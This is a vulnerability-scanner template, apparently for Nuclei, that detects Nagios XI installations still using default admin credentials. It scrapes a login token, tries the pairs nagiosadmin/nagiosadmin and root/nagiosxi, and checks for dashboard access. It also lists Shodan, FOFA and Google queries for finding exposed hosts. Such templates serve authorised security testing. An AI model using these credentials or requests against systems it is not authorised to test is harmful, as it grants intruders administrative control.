id: nagiosxi-default-login

info:
  name: Nagios XI Default Admin Login - Detect
  author: ritikchaddha
  severity: critical
  description: |
    Nagios XI default admin credentials were detected.
  reference:
    - https://nagiosxi.demos.nagios.com/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
    cpe: cpe:2.3:a:nagios:nagios_xi:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 6
    vendor: nagios
    product: nagios_xi
    shodan-query:
      - http.title:"nagios xi"
      - http.favicon.hash:"1460499495"
    fofa-query:
      - app="nagios-xi"
      - icon_hash="1460499495"
      - title="nagios xi"
    google-query: intitle:"nagios xi"
    runzero-match: any(each(service["html.titles"]), {# matches "Nagios XI"})
  tags: nagios,nagiosxi,default-login

http:
  - raw:
      - |
        GET /nagiosxi/login.php HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /nagiosxi/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        nsp={{nsp}}&page=auth&debug=&pageopt=login&username={{username}}&password={{password}}&loginButton=
      - |
        GET /nagiosxi/index.php HTTP/1.1
        Host: {{Hostname}}

    payloads:
      username:
        - nagiosadmin
        - root
      password:
        - nagiosadmin
        - nagiosxi
    attack: pitchfork
    stop-at-first-match: true
    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        part: body_3
        words:
          - 'Home Dashboard</a>'
          - 'Admin</a>'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: nsp
        part: body
        group: 1
        regex:
          - 'name="nsp" value="(.*)">'
        internal: true

